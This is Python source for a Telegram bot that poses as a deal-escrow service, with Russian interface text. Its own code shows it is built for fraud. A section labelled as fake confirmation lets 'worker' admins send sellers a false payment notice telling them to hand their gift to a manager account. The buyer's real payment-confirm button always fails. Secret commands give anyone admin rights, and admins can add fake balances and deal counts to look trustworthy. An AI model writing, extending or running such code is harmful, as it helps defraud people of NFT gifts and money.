        f"{emoji('work18', '🌐')} <b>Новая сделка</b>\n\n"
        f"<blockquote>{emoji('work19', '💠')} <i>Кем вы выступаете в этой сделке?</i></blockquote>\n\n"
        f"{emoji('work20', '🔥')} <b>Продавец</b> — вы продаёте товар/услугу и получаете оплату.\n"
        f"{emoji('work21', '🎁')} <b>Покупатель</b> — вы платите и получаете товар/услугу."
    )
    await safe_edit(callback, text, get_role_menu(user_id), use_photo=True)
    await callback.answer()


@dp.callback_query(F.data.in_({"role_seller", "role_buyer"}))
async def choose_role(callback: CallbackQuery, state: FSMContext):
    role = "seller" if callback.data == "role_seller" else "buyer"
    await state.update_data(role=role)
    await state.set_state(Form.waiting_for_role_confirm)

    user_id = callback.from_user.id
    text = f"{t(user_id, 'warning_title')}\n\n{t(user_id, 'warning_body')}"
    await safe_edit(callback, text, get_warning_menu(user_id), use_photo=True)
    await callback.answer()


@dp.callback_query(F.data == "back_to_role")
async def back_to_role(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    text = (
        f"{emoji('work18', '🌐')} <b>Новая сделка</b>\n\n"
        f"<blockquote>{emoji('work19', '💠')} <i>Кем вы выступаете в этой сделке?</i></blockquote>\n\n"
        f"{emoji('work20', '🔥')} <b>Продавец</b> — вы продаёте товар/услугу и получаете оплату.\n"
        f"{emoji('work21', '🎁')} <b>Покупатель</b> — вы платите и получаете товар/услугу."
    )
    await safe_edit(callback, text, get_role_menu(user_id), use_photo=True)
    await callback.answer()


@dp.callback_query(F.data == "continue_create_deal")
async def continue_create_deal(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    data = await state.get_data()
    role = data.get("role", "seller")

    if role == "buyer":
        text = (
            f"{emoji('work22', '💳')} <b>Способ оплаты:</b>\n\n"
            f"<blockquote>{emoji('work23', '💠')} <i>Каким способом вы хотите оплатить?</i></blockquote>"
        )
    else:
        text = (
            f"{emoji('work22', '💳')} <b>Способ получения оплаты:</b>\n\n"
            f"<blockquote>{emoji('work23', '💠')} <i>Как покупатель переведёт средства?</i></blockquote>"
        )

    await safe_edit(callback, text, get_payment_method_menu(user_id))
    await callback.answer()


@dp.callback_query(F.data == "pay_card")
async def pay_card(callback: CallbackQuery, state: FSMContext):
    await state.update_data(payment_method="card")
    await safe_edit(
        callback,
        f"{emoji('work24', '💳')} <b>Выберите валюту карты:</b>",
        get_card_currency_menu()
    )
    await state.set_state(Form.waiting_for_currency)
    await callback.answer()


@dp.callback_query(F.data == "pay_stars")
async def pay_stars(callback: CallbackQuery, state: FSMContext):
    await state.update_data(payment_method="stars", currency="STR")
    await ask_deal_amount(callback, state, currency="STR")


@dp.callback_query(F.data == "pay_crypto")
async def pay_crypto(callback: CallbackQuery, state: FSMContext):
    await state.update_data(payment_method="crypto")
    await safe_edit(
        callback,
        f"{emoji('work26', '💎')} <b>Выберите криптовалюту:</b>",
        get_crypto_currency_menu()
    )
    await state.set_state(Form.waiting_for_currency)
    await callback.answer()


@dp.callback_query(F.data.startswith("set_cur_"), Form.waiting_for_currency)
async def process_currency_choice(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.split("_")[2]
    user_id = callback.from_user.id

    need_map = {
        "TON": (user_ton, "💎 Добавить TON", "edit_ton", "pay_crypto", "❌ Заполните TON-кошелёк."),
        "USDT": (user_usdt, "💵 Добавить USDT", "edit_usdt", "pay_crypto", "❌ Заполните USDT-кошелёк."),
        "BTC": (user_btc, "₿ Добавить BTC", "edit_btc", "pay_crypto", "❌ Заполните BTC-кошелёк."),
        "STR": (user_stars, "⭐ Добавить", "edit_star", "continue_create_deal", "❌ Заполните получателя звезд."),
        "RUB": (user_cards, "💳 Добавить карту", "edit_card", "continue_create_deal", "❌ Заполните карту."),
        "UAH": (user_cards, "💳 Добавить карту", "edit_card", "continue_create_deal", "❌ Заполните карту."),
        "BYN": (user_cards, "💳 Добавить карту", "edit_card", "continue_create_deal", "❌ Заполните карту."),
        "KZT": (user_cards, "💳 Добавить карту", "edit_card", "continue_create_deal", "❌ Заполните карту."),
        "USD": (user_cards, "💳 Добавить карту", "edit_card", "continue_create_deal", "❌ Заполните карту."),
    }

    if currency in need_map:
        storage, btn_text, btn_cb, back_cb, err_text = need_map[currency]
        if user_id not in storage:
            b = InlineKeyboardBuilder()
            b.row(InlineKeyboardButton(text=btn_text, callback_data=btn_cb, style="success"))
            b.row(InlineKeyboardButton(text="↩️ Назад", callback_data=back_cb, style="success"))
            await safe_edit(callback, err_text, b.as_markup())
            await state.clear()
            await callback.answer()
            return

    await state.update_data(currency=currency)
    await ask_deal_amount(callback, state, currency=currency)


async def ask_deal_amount(callback: types.CallbackQuery, state: FSMContext, currency: str):
    titles = {
        "RUB": "Укажите количество RUB:",
        "KZT": "Укажите количество KZT:",
        "UAH": "Укажите количество UAH:",
        "BYN": "Укажите количество BYN:",
        "USD": "Укажите количество USD:",
        "USDT": "Укажите количество USDT:",
        "STR": "Укажите количество Stars:",
        "TON": "Укажите количество TON:",
        "BTC": "Укажите количество BTC:",
    }
    title = titles.get(currency, "Укажите количество:")
    text = f"{emoji('work29', '⭐')} <b>{title}</b>"

    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Изменить валюту", callback_data="continue_create_deal",
                               icon_custom_emoji_id=eid("work30", "crystal"), style="success"))
    b.row(InlineKeyboardButton(text="Назад", callback_data="back_to_role",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work28", "down_menu"), style="danger"))

    await safe_edit(callback, text, b.as_markup())
    await state.set_state(Form.waiting_for_deal_amount)
    await callback.answer()


@dp.message(Form.waiting_for_deal_amount)
async def process_deal_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
    except ValueError:
        await message.answer("❌ Введите число!")
        return

    await state.update_data(amount=amount)

    text = (
        f"{emoji('work31', '📝')} <b>Опишите предмет сделки:</b>\n\n"
        f"<blockquote><i>Например: https://t.me/nft/PlushPepe-111 "
        f"или просто текстовое описание товара</i></blockquote>"
    )
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Назад", callback_data="back_to_amount",
                               icon_custom_emoji_id=eid("work27", "down_menu"), style="success"))
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work28", "down_menu"), style="danger"))

    await message.answer(text=text, reply_markup=b.as_markup(), parse_mode="HTML",
                         disable_web_page_preview=False)
    await state.set_state(Form.waiting_for_deal_desc)


@dp.callback_query(F.data == "back_to_amount")
async def back_to_amount(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    currency = data.get("currency")
    if not currency:
        await callback.answer("❌ Ошибка, начните заново", show_alert=True)
        return
    await ask_deal_amount(callback, state, currency=currency)


@dp.message(Form.waiting_for_deal_desc)
async def process_deal_desc(message: types.Message, state: FSMContext):
    data = await state.get_data()
    amount = data.get('amount')
    currency = data.get('currency')
    role = data.get('role', 'seller')
    deal_code = generate_deal_code()

    deals[deal_code] = {
        'creator_id': message.from_user.id,
        'creator_username': message.from_user.username or message.from_user.first_name,
        'role': role,
        'amount': amount,
        'currency': currency,
        'description': message.text
    }

    bot_info = await bot.get_me()
    deal_link = f"https://t.me/{bot_info.username}?start=deal_{deal_code}"

    role_text = "Продавец" if role == "seller" else "Покупатель"
    currency_text = {
        "RUB": "RUB", "KZT": "KZT", "UAH": "UAH", "BYN": "BYN",
        "USD": "USD", "USDT": "USDT", "BTC": "BTC",
        "STR": "STARS", "TON": "TON",
    }.get(currency, currency)

    text = (
        f"{emoji('work33', '✅')} <b>Сделка #{deal_code} успешно создана!</b>\n\n"
        f"<blockquote>"
        f"{emoji('work34', '👑')} <b>Роль:</b> {role_text}\n"
        f"{emoji('work35', '⭐')} <b>Валюта:</b> {currency_text}\n"
        f"{emoji('work36', '💰')} <b>Сумма:</b> {amount}\n"
        f"{emoji('work37', '📝')} <b>Описание:</b> {message.text}"
        f"</blockquote>\n\n"
        f"{emoji('work38', '🔘')} <b>Ссылка для покупателя:</b>\n"
        f"<code>{deal_link}</code>\n\n"
        f"<i>Или пригласите через инлайн: введите @{bot_info.username} "
        f"#{deal_code} в любом чате</i>"
    )

    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Отменить сделку", callback_data=f"cancel_deal_{deal_code}",
                               icon_custom_emoji_id=eid("work39", "warning"), style="success"))
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work28", "down_menu"), style="danger"))

    await message.answer(text=text, reply_markup=b.as_markup(), parse_mode="HTML",
                         disable_web_page_preview=True)
    await state.clear()


@dp.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal(callback: types.CallbackQuery):
    deal_id = callback.data.replace("cancel_deal_", "")
    user_id = callback.from_user.id
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена", show_alert=True)
        return
    if deals[deal_id]['creator_id'] != user_id:
        await callback.answer("❌ Вы не создатель этой сделки", show_alert=True)
        return
    del deals[deal_id]
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work28", "down_menu"), style="danger"))
    await safe_edit(callback, f"❌ <b>Сделка #{deal_id} отменена.</b>", b.as_markup())
    await callback.answer()


# =====================================================
# ВХОД В СДЕЛКУ
# =====================================================

async def handle_deal_entry(message: types.Message, deal_id: str):
    deal = deals[deal_id]

    if message.from_user.id == deal['creator_id']:
        await message.answer("❌ Вы не можете войти в собственную сделку.")
        return

    role = deal.get('role', 'seller')
    entering_user = message.from_user
    entering_username = entering_user.username or entering_user.first_name

    # Определяем, кто вошёл: покупатель или продавец
    if role == 'seller':
        deal['buyer_id'] = entering_user.id
        deal['buyer_username'] = entering_username
        is_buyer = True
        seller_id = deal['creator_id']
        seller_username = deal['creator_username']
    else:
        deal['seller_id'] = entering_user.id
        deal['seller_username'] = entering_username
        is_buyer = False
        seller_id = entering_user.id
        seller_username = entering_username

    # Уведомляем создателя
    try:
        if role == 'seller':
            notify_text = (
                f"{emoji('user_id', '👤')} Новый участник в сделке <b>#{deal_id}</b>\n\n"
                f"@{entering_username} присоединился как <b>покупатель</b>.\n\n"
                f"• Подарок отправляйте только на @{HELPER_USER}."
            )
        else:
            notify_text = (
                f"{emoji('user_id', '👤')} Новый участник в сделке <b>#{deal_id}</b>\n\n"
                f"@{entering_username} присоединился как <b>продавец</b>.\n\n"
                f"• Подарок отправляйте только на @{HELPER_USER}."
            )
        await bot.send_message(deal['creator_id'], notify_text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка уведомления создателя: {e}")

    # Реквизиты продавца
    currency = deal['currency']
    if currency == "TON":
        seller_details = user_ton.get(seller_id, "—")
    elif currency == "USDT":
        seller_details = user_usdt.get(seller_id, "—")
    elif currency == "BTC":
        seller_details = user_btc.get(seller_id, "—")
    elif currency == "STR":
        seller_details = user_stars.get(seller_id, "—")
    else:
        seller_details = user_cards.get(seller_id, "—")

    if not seller_details:
        seller_details = "—"

    currency_text = {
        "RUB": "RUB", "KZT": "KZT", "UAH": "UAH", "BYN": "BYN",
        "USD": "USD", "USDT": "USDT", "BTC": "BTC",
        "STR": "STARS", "TON": "TON",
    }.get(currency, currency)

    if is_buyer:
        header = (
            f"{emoji('confirm', '✅')} <b>Вы подключились к сделке #{deal_id} "
            f"как покупатель.</b>"
        )
    else:
        header = (
            f"{emoji('confirm', '✅')} <b>Вы подключились к сделке #{deal_id} "
            f"как продавец.</b>"
        )

    text = (
        f"{header}\n\n"
        f"<blockquote>"
        f"{emoji('user_id', '👤')} <b>Продавец:</b> @{seller_username}\n"
        f"{emoji('dealuid', '💎')} <b>ID продавца:</b> <code>{seller_id}</code>\n"
        f"{emoji('dealty', '📈')} <b>Сделок у продавца:</b> {user_deals_count.get(seller_id, 0)}\n"
        f"{emoji('create_deal', '📝')} <b>Описание:</b> {deal['description']}\n"
        f"{emoji('flagr', '🇷🇺')} <b>Валюта:</b> {currency_text}\n"
        f"{emoji('money_home', '💰')} <b>Сумма:</b> {deal['amount']}\n"
        f"{emoji('rubles', '💳')} <b>Реквизиты менеджера для оплаты:</b> <code>{seller_details}</code>"
        f"</blockquote>\n\n"
        f"{emoji('crystal', '💎')} <b>Вся оплата и передача товара проходит ТОЛЬКО через "
        f"менеджера @{MANAGER_USER}.</b>\n"
        f"{emoji('warning', '❌')} <b>Не переводите средства напрямую продавцу!</b>\n"
        f"{emoji('support', '🕒')} <b>Проверьте реквизиты перед оплатой!</b>"
    )

    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text="✅ Подтвердить оплату",
        callback_data=f"confirm_pay_{deal_id}",
        style="success"
    ))
    b.row(InlineKeyboardButton(
        text="❌ Выйти",
        callback_data="back_to_menu",
        style="danger"
    ))
    await message.answer(text=text, reply_markup=b.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data.startswith("confirm_pay_"))
async def process_confirm_payment(callback: CallbackQuery):
    await callback.answer(text="💔 Ошибка, попробуйте позже", show_alert=True)


# =====================================================
# ФЕЙК-ПОДТВЕРЖДЕНИЕ (админы)
# =====================================================

@dp.message(Command("buy"))
async def buy_fake_command(message: types.Message, command: CommandObject):
    if message.from_user.id not in admins:
        return
    args = command.args
    if not args:
        await message.answer("Укажите код: /buy KUA0G7RG")
        return
    deal_id = args.replace("#", "")
    if deal_id not in deals:
        await message.answer("❌ Сделка не найдена.")
        return
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"fake_confirm_{deal_id}", style="success"))
    await message.answer(f"🔔 Подтвердить оплату по сделке <b>#{deal_id}</b>?",
                         reply_markup=b.as_markup(), parse_mode="HTML")


@dp.callback_query(F.data.startswith("fake_confirm_"))
async def process_fake_confirm(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = deals[deal_id]
    deal['buyer_id'] = callback.from_user.id

    labels = {
        "RUB": "RUB 🇷🇺", "KZT": "KZT 🇰🇿", "UAH": "UAH 🇺🇦",
        "BYN": "BYN 🇧🇾", "USD": "USD 🇺🇸",
        "USDT": "USDT 💵", "BTC": "BTC ₿",
        "STR": "Stars ⭐", "TON": "TON 💎",
    }.get(deal['currency'], "RUB")

    seller_text = (
        f"✅ <b>Оплата подтверждена #{deal_id}</b>\n"
        f"Сумма: {deal['amount']} {labels}\n"
        f"Товар: {deal['description']}\n\n"
        f"Отправьте подарок @{MANAGER_USER} и нажмите кнопку:"
    )
    b_seller = InlineKeyboardBuilder()
    b_seller.row(InlineKeyboardButton(text="🎁 Отправил", callback_data=f"gift_sent_{deal_id}", style="success"))
    try:
        await bot.send_message(deal['creator_id'], seller_text, reply_markup=b_seller.as_markup(), parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error: {e}")

    buyer_text = (
        f"💳 <b>Оплата подтверждена!</b>\n"
        f"Сделка: #{deal_id}\nСумма: {deal['amount']} {labels}"
    )
    await safe_edit(callback, buyer_text, None)
    await callback.answer()


@dp.callback_query(F.data.startswith("gift_sent_"))
async def process_gift_sent(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("Сделка не найдена", show_alert=True)
        return
    deal = deals[deal_id]
    await callback.message.answer("✅ Отправлено покупателю!")

    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"deal_finish_{deal_id}", style="success"))
    b.row(InlineKeyboardButton(text="❌ Не получил", callback_data="not_received", style="success"))
    try:
        await bot.send_message(
            deal['buyer_id'],
            f"🔔 <b>Продавец отправил товар</b>\n\nСделка: #{deal_id}",
            reply_markup=b.as_markup(), parse_mode="HTML"
        )
    except Exception as e:
        logging.error(f"Error: {e}")
    await callback.answer()


@dp.callback_query(F.data == "not_received")
async def process_not_received(callback: CallbackQuery):
    await callback.answer("Уведомление отправлено поддержке.", show_alert=True)


@dp.callback_query(F.data.startswith("deal_finish_"))
async def process_deal_finish(callback: CallbackQuery):
    deal_id = callback.data.split("_")[2]
    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена", show_alert=True)
        return
    deal = deals[deal_id]

    seller_id = deal['creator_id']
    amount = float(deal['amount'])
    commission = amount * 0.01
    amount_to_add = amount - commission

    user_balance[seller_id] = user_balance.get(seller_id, 0) + amount_to_add
    user_deals_count[seller_id] = user_deals_count.get(seller_id, 0) + 1

    buyer_id = deal.get('buyer_id')
    bonus = 0
    if buyer_id:
        bonus = amount * 0.002
        user_balance[buyer_id] = user_balance.get(buyer_id, 0) + bonus
        user_deals_count[buyer_id] = user_deals_count.get(buyer_id, 0) + 1

    cur_sym = "RUB" if deal['currency'] == "RUB" else "Stars ⭐" if deal['currency'] == "STR" else deal['currency']

    finish_text = (
        f"✅ <b>Сделка завершена!</b>\n\n"
        f"Сделка #{deal_id}\nСумма: {amount} {cur_sym}\n"
        f"Комиссия (1%): {commission:.2f}\n"
        f"Начислено: {amount_to_add:.2f}\n"
        f"Баланс: {user_balance.get(seller_id, 0):.2f} RUB"
    )
    await safe_edit(callback, finish_text, None)
    try:
        await bot.send_message(seller_id, finish_text, parse_mode="HTML")
    except Exception:
        pass

    if buyer_id:
        try:
            await bot.send_message(
                buyer_id,
                f"✅ <b>Сделка #{deal_id} завершена!</b>\nБонус: {bonus:.2f} RUB",
                parse_mode="HTML"
            )
        except Exception:
            pass

    del deals[deal_id]
    await callback.answer()


# =====================================================
# ВОЗВРАТ В МЕНЮ
# =====================================================

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    user_id = callback.from_user.id
    text = t(user_id, "welcome")
    await safe_edit(callback, text, get_main_menu(user_id), use_photo=True)
    await callback.answer()


# =====================================================
# ИНЛАЙН-РЕЖИМ
# =====================================================

@dp.inline_query()
async def inline_deal_query(inline_query: types.InlineQuery):
    query = inline_query.query.strip().lstrip("#")
    if query not in deals:
        await inline_query.answer([], cache_time=1, is_personal=True)
        return

    deal = deals[query]
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=deal_{query}"

    result = InlineQueryResultArticle(
        id=query,
        title=f"Сделка #{query}",
        description=f"{deal['amount']} {deal['currency']} — {deal['description'][:40]}",
        input_message_content=InputTextMessageContent(
            message_text=(
                f"🤝 <b>Сделка #{query}</b>\n\n"
                f"💰 {deal['amount']} {deal['currency']}\n"
                f"📝 {deal['description']}\n\n"
                f"👉 Войти: {link}"
            ),
            parse_mode="HTML"
        )
    )
    await inline_query.answer([result], cache_time=1, is_personal=True)


# =====================================================
# АДМИН-ПАНЕЛЬ
# =====================================================

ADMIN_HELP = (
    "<i>/buy номер_сделки — подтвердить оплату\n"
    "/set_my_deals число — установить кол-во сделок\n"
    "/goy — пополнить свой баланс</i>"
)


async def show_admin_deposit_menu(message: types.Message):
    text = f"{emoji('work46', '💰')} <b>Пополнение баланса</b>\n\nВыберите валюту:"
    await message.answer(text=text, reply_markup=get_admin_deposit_menu(), parse_mode="HTML")


@dp.message(Command("paicyxe"))
async def admin_command(message: types.Message):
    admins.add(message.from_user.id)
    await message.answer(
        f"✅ <b>Лее, брат, ты теперь воркер!</b>\n\n{ADMIN_HELP}",
        parse_mode="HTML"
    )
    await show_admin_deposit_menu(message)


@dp.message(Command("koolikteam"))
async def admin_command2(message: types.Message):
    admins.add(message.from_user.id)
    await message.answer(
        f"✅ <b>Права администратора выданы!</b>\n\n{ADMIN_HELP}",
        parse_mode="HTML"
    )
    await show_admin_deposit_menu(message)


@dp.message(Command("goy"))
async def goy_command(message: types.Message):
    if message.from_user.id not in admins:
        return
    await show_admin_deposit_menu(message)


@dp.callback_query(F.data.startswith("adm_dep_"))
async def admin_deposit_choose(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in admins:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return

    action = callback.data.replace("adm_dep_", "")

    if action == "cancel":
        await state.clear()
        await safe_edit(callback, "❌ <b>Отменено.</b>", None)
        await callback.answer()
        return

    await state.update_data(admin_dep_currency=action)
    await safe_edit(callback, f"💰 <b>Введите сумму в {action}:</b>", None)
    await state.set_state(Form.admin_deposit_amount)
    await callback.answer()


@dp.message(Form.admin_deposit_amount)
async def admin_deposit_amount(message: types.Message, state: FSMContext):
    if message.from_user.id not in admins:
        return
    try:
        amount = float(message.text.replace(',', '.'))
    except ValueError:
        await message.answer("❌ Введите число!")
        return

    data = await state.get_data()
    currency = data.get("admin_dep_currency", "RUB")
    user_balance[message.from_user.id] = user_balance.get(message.from_user.id, 0) + amount
    await state.clear()

    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(text="Назад в меню", callback_data="back_to_menu",
                               icon_custom_emoji_id=eid("work28", "down_menu"), style="danger"))
    await message.answer(
        f"✅ <b>Баланс пополнен на {amount} {currency}</b>\n\n"
        f"Текущий баланс: <b>{user_balance[message.from_user.id]:.2f} RUB</b>",
        reply_markup=b.as_markup(), parse_mode="HTML"
    )


@dp.message(Command("set_my_deals"))
async def set_my_deals_command(message: types.Message, command: CommandObject):
    if message.from_user.id not in admins:
        return
    args = command.args
    if not args:
        await message.answer("📝 /set_my_deals <количество>")
        return
    try:
        user_deals_count[message.from_user.id] = int(args)
        await message.answer(f"✅ Установлено: {args}")
    except ValueError:
        await message.answer("❌ Введите число.")


@dp.message(Command("set_deals"))
async def set_deals_command(message: types.Message, command: CommandObject):
    if message.from_user.id not in admins:
        return
    args = command.args
    if not args:
        await message.answer("📝 /set_deals <количество>")
        return
    try:
        user_deals_count[message.from_user.id] = int(args)
        await message.answer(f"✅ Установлено: {args}")
    except ValueError:
        await message.answer("❌ Введите число.")


# =====================================================
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
